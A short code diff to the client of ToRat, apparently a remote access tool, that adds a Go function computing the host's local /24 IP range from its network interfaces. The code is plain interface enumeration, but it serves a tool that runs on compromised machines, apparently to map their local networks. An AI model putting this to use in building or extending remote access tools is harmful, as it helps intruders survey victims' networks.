@@ -5,9 +5,11 @@ import (
 	"errors"
 	"image/png"
 	"io/ioutil"
+	"net"
 	"os"
 	"path/filepath"
 	"reflect"
+	"strings"
 
 	"github.com/lu4p/ToRat/shared"
 	"github.com/lu4p/ToRat/torat_client/crypto"
@@ -156,4 +158,22 @@ func (a *API) Cd(path string, r *shared.Dir) (err error) {
 	r.Path = cwd
 	r.Files, err = filepath.Glob("*")
 	return err
+}
+
+// GetLocalRange returns local ip range or defaults on error to most common
+func GetLocalRange() string {
+	addrs, err := net.InterfaceAddrs()
+	if err != nil {
+		return "192.168.1.0/24"
+	}
+	for _, address := range addrs {
+		// check the address type and if it is not a loopback the display it
+		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
+			if ipnet.IP.To4() != nil {
+				split := strings.Split(ipnet.IP.String(), ".")
+				return split[0] + "." + split[1] + "." + split[2] + ".0/24"
+			}
+		}
+	}
+	return "192.168.1.0/24"
 }
